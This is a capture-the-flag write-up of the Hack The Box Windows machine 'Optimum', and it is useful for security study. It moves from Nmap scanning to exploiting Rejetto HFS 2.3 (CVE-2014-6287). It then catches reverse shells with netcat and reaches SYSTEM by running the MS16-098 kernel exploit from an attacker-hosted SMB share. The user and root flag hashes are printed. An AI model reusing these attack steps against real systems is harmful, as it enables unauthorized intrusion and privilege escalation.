# Optimum
>Author : Xyan1d3
>Date : 28th June 2021
>IP : 10.10.10.8
>OS : Windows
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Mon Jun 28 16:20:55 2021 as: nmap -sC -sV -v -oN nmap/optimum 10.10.10.8
Nmap scan report for optimum.htb (10.10.10.8)
Host is up (0.076s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see that we have only port `80/tcp` open which shows the banner of `HttpFileServer httpd 2.3` which we can look for an available exploits.

## Web Enumeration
We take a look at the page running on `80/tcp` which shows that it is running `Rejetto HttpFileServer 2.3`.
![[Pasted image 20210628162535.png]]

We do a simple `searchsploit` to find out that the site is vulnerable to `Unauthenticated Remote Command Execution`.

![[Pasted image 20210628164048.png]]

We copy the exploit to our home directory using `searchsploit -m` and run the exploit.
```python
# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 28-11-2020
# Remote: Yes
# Exploit Author: Óscar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

*** SNIP ***
```

To run the exploit we must enter `python3 exploit.py RHOST RPORT CMD`.

To, Test this exploit we could run a `netcat` on `80/tcp` and try to curl on us using powershell `Invoke-WebRequest`.

![[Pasted image 20210628165136.png]]

# Initial FootHold as kotas
We could abuse the vulnerablility to get a shell on the box by executing a Nishang Reverse Shell on the box.

![[Pasted image 20210628170038.png]]

We could now get the `user.txt`.
```powershell
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/optimum]
└──╼ # nc -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.10.8 49226

PS C:\Users\kostas\Desktop> whoami
optimum\kostas
PS C:\Users\kostas\Desktop> ls


    Directory: C:\Users\kostas\Desktop


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
-ar--         18/3/2017   2:13 ??         32 user.txt.txt                                                              


PS C:\Users\kostas\Desktop> cat user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73
```

# Root Escalation
For, Root Escalcation we need to check the system OS information for finding any possible exploits.
```python
PS C:\Users\kostas\Desktop> systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          4/7/2021, 10:47:11 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC           
```

There are also a bunch of hostfixes installed.
```python
Hotfix(s):                 31 Hotfix(s) Installed.                                                                                                                       
                           [01]: KB2959936 
                           [02]: KB2896496 
                           [03]: KB2919355 
                           [04]: KB2920189 
                           [05]: KB2928120 
                           [06]: KB2931358 
                           [07]: KB2931366 
                           [08]: KB2933826 
                           [09]: KB2938772 
                           [10]: KB2949621 
                           [11]: KB2954879 
                           [12]: KB2958262 
                           [13]: KB2958263 
                           [14]: KB2961072 
                           [15]: KB2965500 
                           [16]: KB2966407 
                           [17]: KB2967917 
                           [18]: KB2971203 
                           [19]: KB2971850 
                           [20]: KB2973351 
                           [21]: KB2973448 
                           [22]: KB2975061 
                           [23]: KB2976627 
                           [24]: KB2977629 
                           [25]: KB2981580 
                           [26]: KB2987107 
                           [27]: KB2989647 
                           [28]: KB2998527 
                           [29]: KB3000850 
                           [30]: KB3003057 
                           [31]: KB3014442
```

# Root Escalation
This is a `Windows Server 2012 R2` x64 Os which is has many vulnerabilities of which we will be exploiting `MS16-098`.

## Exploiting MS16-098
Exploit Link : https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe
We will also need a normal netcat shell with `cmd.exe` to pull off this exploit.
So, We Make a `www` directory and copy `nc64.exe` and `bfill.exe` there and host it with Impacket `smbserver.py`.

![[Pasted image 20210628182951.png]]

```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/optimum/www]
└──╼ # nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.8 49188
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas

C:\Users\kostas\Desktop>\\10.10.14.11\magisk\bfill.exe
\\10.10.14.11\magisk\bfill.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```


We are now, `NT Authority/SYSTEM` on the box and can now get our `root.txt`
```python
C:\Users\kostas\Desktop>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\Administrator\Desktop

18/03/2017  03:14     <DIR>          .
18/03/2017  03:14     <DIR>          ..
18/03/2017  03:14                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  31.885.611.008 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
51ed1b36553c8461f4552c2e92b3eeed
```